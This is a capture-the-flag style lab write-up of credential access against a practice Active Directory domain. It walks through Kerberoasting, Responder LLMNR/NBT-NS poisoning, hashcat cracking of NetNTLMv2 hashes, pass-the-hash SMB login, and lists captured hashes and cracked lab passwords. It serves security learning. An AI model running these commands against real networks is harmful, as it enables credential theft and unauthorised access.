# 3. Credential Access

## 3.1 Kerberoasting

Is an attack technique which tries to identify service accounts with SPNs (Service Principal Names). 
After identifying service accounts, it uses a valid domain user account to request tickets for the SPNs. These tickets are encrypted using the NTLM hash of the service account's password. These tickets are extracted and then if these hashes are cracked, the plaintext password of the service account is exposed.

To launch this attack, I will use again an impacket tool: GetUserSPN.

```shell
GetUserSPNs.py -request -dc-ip 10.4.10.11 north.sevenkingdoms.local/brandon.stark:iseedeadpeople -outputfile kerberoasting
```

The result I got is:

<img width="1438" alt="Pasted_image_20241223113738" src="https://github.com/user-attachments/assets/32421729-574c-49c3-bd75-e50effbb1153" />

So, I didn't get any tickets, and the reason is the error in the end of the response:
`Kerberos Sessionrror: KRB_AP_ERR_SKEW(Clock skew too great)`, which means that there is a discrepancy in time from the our machine and the server that I'm trying to access.

In this case I have to adjust the time on my machine (Kali) so they match.

First disable the Network Time Protocol from auto-updating by running `sudo timedatectl set-ntp off`.

Then match the date and time of Kali with the date and time of the target machine by running `sudo rdate -n 10.4.10.11`

Now I'm going to try again the kerberoasting attack, and we got the hashes:
<img width="1601" alt="Pasted_image_20241223124857" src="https://github.com/user-attachments/assets/93451ed6-9ddc-4b51-9a01-d581ca4dd20b" />

So we got another password, and now in total we have pwned 4 accounts:

```shell
samwell.tarly:Heartsbane
hodor:hodor
brandon.stark:iseedeadpeople
jon.snow:iknownothing
```

## 3.2 Responder 

When you don't have any credentials, `responder` is a tool that may give you usernames, netntlmv1 (if the server is old), netntlmv2 hashes, the ability to redirect the authentication (NTLM relay), etc.

- NetNLMv1 and NetNLMv2 - are password hashes used by NTLM (NT LAN Manager) authentication protocol, which is a legacy Microsoft authentication mechanism, and are primarily used in challenge-response authentication processes, such as authenticating users against servers or services.
- NetNTLMv1 - is less secure and more vulnerable to attacks:
	- A client sends its username and a challenge (random number)
	- Server responds with a challenge
	- The client uses the password to compute a hash to the challenge and sends it back.
		- It's vulnerable against brute-force and cryptographic attacks because the challenge-response mechanism is not well-protected.

- NetNLMv2 - is a more secure version of NTLM and includes stronger cryptographic measures.
	- Similar to v1 but the challenge-response mechanism uses a hash timestamp, client nonce, and additional data to protect against replay attacks.
		-  Still susceptible to certain relay attacks but much more resistant to brute-force than NetNTLMv1.

- NTLM Relay - is a type of attack which exploits the way how NTLM authentication works, by relaying authentication attempts to another system or service.
	- The attacker captures a challenge-response from a victim.
	- Instead of cracking the hash, the attacker relays it to a different service or system that accepts NTLM authentication (SMB, LDAP, HTTP).
	- If the relayed creds are valid, the attacker can gain unauthorized access to the target system.

Now I will start `responder` to see if I can get some useful information, and to run the tool I need to know the network interface which I will target, to capture and analyze authentication attempts.

Responder acts as a rogue server, and tricks devices on a network to send authentication data, which then the attacker can use for a number of attacks, such as cracking password hashes, and NTLM relay.

By running `ip a` I see the network interfaces, and the name of the target is `eth0`.

Then I run `responder -I eth0` and the following things happen:

- Responder listens for specific protocols like: LLMNR (Link-Local Multicast Name Resolution) and NBT-NS (NetBIOS Name Service) on eth0.
- When devices on network broadcast queries for names they can't resolve, Responder sends a fake reply pretending to be that service or host.
- When the victim system attempts to authenticate to the fake service, Responder captures the credential hashes.

By this method, I could get hashes of two accounts: **eddard.stark & robb.stark**:

```bash
[SMB] NTLMv2-SSP Client   : 10.4.10.11
[SMB] NTLMv2-SSP Username : NORTH\eddard.stark
[SMB] NTLMv2-SSP Hash     : eddard.stark::NORTH:98db915729cbf673:CAA545B4D425834F5887741416A33EA4:0101000000000000806D80798655DB01D9983AFE29AEA80B0000000002000800540033003400380001001E00570049004E002D0034004200410059005A0059005600300047003300500004003400570049004E002D0034004200410059005A005900560030004700330050002E0054003300340038002E004C004F00430041004C000300140054003300340038002E004C004F00430041004C000500140054003300340038002E004C004F00430041004C0007000800806D80798655DB01060004000200000008003000300000000000000000000000003000005DE594947D1925B89E880EBD1422F0706D876ECC261071DC3B4B573725EFACA20A001000000000000000000000000000000000000900140063006900660073002F004D006500720065006E000000000000000000
```

```bash
[SMB] NTLMv2-SSP Client   : 10.4.10.11
[SMB] NTLMv2-SSP Username : NORTH\robb.stark
[SMB] NTLMv2-SSP Hash     : robb.stark::NORTH:7f945256f0b1ca59:CA2F97E8985703DB0ABE10C43612E499:0101000000000000806D80798655DB0150433DACC59B7BB40000000002000800540033003400380001001E00570049004E002D0034004200410059005A0059005600300047003300500004003400570049004E002D0034004200410059005A005900560030004700330050002E0054003300340038002E004C004F00430041004C000300140054003300340038002E004C004F00430041004C000500140054003300340038002E004C004F00430041004C0007000800806D80798655DB01060004000200000008003000300000000000000000000000003000005DE594947D1925B89E880EBD1422F0706D876ECC261071DC3B4B573725EFACA20A001000000000000000000000000000000000000900160063006900660073002F0042007200610076006F0073000000000000000000
```

Now export both hashes (only the hash starting with for example robb.stark...) to a file to try and crack them with hashcat.

```bash
hashcat -m 5600 --force -a 0 two_hashes /usr/share/wordlists/rockyou.txt
```

I only got success with one account, one of robb.stark:

```bash
ROBB.STARK::NORTH:7f945256f0b1ca59:ca2f97e8985703db0abe10c43612e499:0101000000000000806d80798655db0150433dacc59b7bb40000000002000800540033003400380001001e00570049004e002d0034004200410059005a0059005600300047003300500004003400570049004e002d0034004200410059005a005900560030004700330050002e0054003300340038002e004c004f00430041004c000300140054003300340038002e004c004f00430041004c000500140054003300340038002e004c004f00430041004c0007000800806d80798655db01060004000200000008003000300000000000000000000000003000005de594947d1925b89e880ebd1422f0706d876ecc261071dc3b4b573725efaca20a001000000000000000000000000000000000000900160063006900660073002f0042007200610076006f0073000000000000000000:sexywolfy
```

Now let's see what kind of privileges does this account have:

```bash
crackmapexec smb 10.4.10.11 -u robb.stark -p sexywolfy --shares
```

And this account has ADMIN privileges:

<img width="1277" alt="Pasted_image_20241229172248" src="https://github.com/user-attachments/assets/a1c75f2b-8bbf-4033-a0e5-65e6a0dc6aa5" />

I logged in with smbclient by passing the hash:

`smbclient.py -hashes :831486ac7f26860c9e2f51ac91e1a07a NORTH/robb.stark@10.4.10.22`

used all share:

`use all`

there i found an arya.txt file and inside it was a CTF with the password "Needle".

```bash
Subject: Quick Departure

Hey Arya,

I hope this message finds you well. Something urgent has come up, and I have to leave for a while. Don't worry; I'll be back soon.

I left a little surprise for you in your room – the sword You've named "Needle." It felt fitting, given your skills. Take care of it, and it'll take care of you.

I'll explain everything when I return. Until then, stay sharp, sis.
```

**Full Credential Set So Far**

```
samwell.tarly : Heartsbane
hodor         : hodor
brandon.stark : iseedeadpeople
jon.snow      : iknownothing
robb.stark    : sexywolfy
arya.stark    : needle
```

